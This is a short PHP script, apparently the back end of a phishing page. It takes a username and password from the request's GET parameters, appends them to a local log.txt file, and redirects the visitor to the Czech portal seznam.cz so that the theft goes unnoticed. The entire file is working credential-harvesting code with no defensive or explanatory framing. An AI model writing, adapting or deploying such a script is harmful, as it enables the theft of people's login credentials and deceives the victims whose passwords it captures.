<?php
$data=($_GET["name"]) . ':' .  ($_GET["password"] . "\n");
$fp=fopen('log.txt', 'a');
fwrite($fp, $data);
fclose($fp);

header('location: www.seznam.cz');
?>